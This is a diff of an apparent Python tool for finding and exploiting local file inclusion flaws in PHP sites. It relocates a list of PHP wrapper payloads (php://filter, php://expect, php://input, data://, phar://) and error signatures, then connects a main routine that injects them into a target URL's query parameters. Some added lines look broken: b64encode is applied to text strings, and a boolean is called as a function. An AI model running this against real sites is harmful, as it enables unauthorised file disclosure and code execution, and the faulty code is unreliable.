@@ -11,26 +11,9 @@ import threading
 import requests
 
 from Crawler import Crawler
-from usage import usage
+from usage import usage, injection_usage
+from items import payloads, errors
 
-payloads = {
-    "../": "../",
-    "b64encode"        : "php://filter/convert.base64-encode/resource=",
-    "b64decode"        : "php://filter/convert.base64-decode/resource=",
-    "rot13"            : "php://filter/read=string.rot13/resource=",
-    "utf-16"           : "php://filter/convert.iconv.utf-8.utf-16/resource=",
-    "expect"           : "php://expect/",
-    "input"            : "php://input",
-    "data://"          : "data://text/plain;base64,",
-    "zip://"           : "zip://",
-    "phar://"          : "phar://"
-}
-
-errors = [
-    "Warning: file_exists()",
-    "Warning: include()",
-    "failed to open stream"    
-]
 
 def injectable(url):
     regex = re.compile('\?[a-zA-Z0-9]{1,}=')
@@ -103,7 +86,13 @@ def exploit(payload):
                         print(base64.b64decode(i).decode())
                     except:
                         pass
-        
+            elif re.search('base64-decode', payload):
+                for i in re.findall('[a-zA-Z0-9+/]+={,2}', r.text):
+                    try:
+                        print(base64.b64encode(i).decode())
+                    except:
+                        pass
+            
         elif r.status_code == 404:
             print("Code: 404 Page Not Found")
                  
@@ -150,18 +139,20 @@ def main():
         usage() 
     elif type(url) is str:
         if scan:
-            test = False
-            inject = False
+            pass #TODO
         elif test:
-            inject = False
+            test(url)
         elif inject:
             valid = True
             for key in injectdict:
                 if injectdict[key] == None:
                     valid = False
-            if not valid:
-                inject = False
-    
+            if valid and injectdict["type"] in payloads:
+                inject(url, injectdict["type"], injectdict["resource"])
+            elif not valid:
+                usage()
+            else:
+                injection_usage()       
     else:
         print("Error. You have to enter a url.")
         usage()
